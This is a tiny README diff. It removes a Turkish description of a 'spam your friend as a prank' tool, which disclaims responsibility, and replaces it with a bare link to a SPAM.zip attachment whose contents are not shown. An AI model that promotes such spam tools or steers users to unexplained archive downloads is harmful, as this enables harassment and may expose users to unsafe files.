@@ -1,2 +1,2 @@
-# SPAM-
-spam atarak arkadaşınıza şaka yapın SORUMLULUK BANA AİT DEİLDİR
+[SPAM.zip](https://github.com/user-attachments/files/33308180/SPAM.zip)
+
